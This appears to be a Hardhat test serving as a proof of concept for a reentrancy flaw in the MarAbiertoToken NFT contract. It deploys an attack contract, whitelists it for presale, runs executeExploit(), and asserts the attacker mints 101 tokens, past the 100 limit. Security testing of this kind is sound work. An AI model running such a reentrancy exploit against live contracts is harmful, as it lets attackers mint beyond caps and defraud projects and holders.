import { expect } from "chai";
import { ethers } from "hardhat"
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { MarAbiertoToken__factory, ReentrancyAttack__factory } from "../typechain-types";

async function MarAbiertoFixture() {
    const [owner, user, WhiteHat, withdrawer] = await ethers.getSigners();

    const MarAbiertoTokenFactory = (await ethers.getContractFactory(
        "MarAbiertoToken", owner
    )) as MarAbiertoToken__factory;
    const NFTContract = await MarAbiertoTokenFactory.deploy("test", withdrawer.address);
    const ReentrancyAttack__factory = (await ethers.getContractFactory(
        "ReentrancyAttack", WhiteHat
    )) as ReentrancyAttack__factory;
    const ReentrancyAttack = await ReentrancyAttack__factory.deploy(NFTContract.address);

    return { NFTContract, ReentrancyAttack, owner, user, withdrawer, WhiteHat}
}

describe("MarAbiertoToken Reentrancy POC", function () {
    describe("mintPresale possible reentrancy attack", function () {
        it("Should mint more than 100 tokens in a tx", async function () {
            const { NFTContract, ReentrancyAttack, owner, WhiteHat } = await loadFixture(MarAbiertoFixture);
            await NFTContract.connect(owner).enablePresaleMinting();
            await NFTContract.connect(owner).addAddressesToWhitelist([ReentrancyAttack.address]);

            await ReentrancyAttack.connect(WhiteHat).executeExploit();
            await expect(await NFTContract.balanceOf(ReentrancyAttack.address)).to.equal(101);
        })
    })
})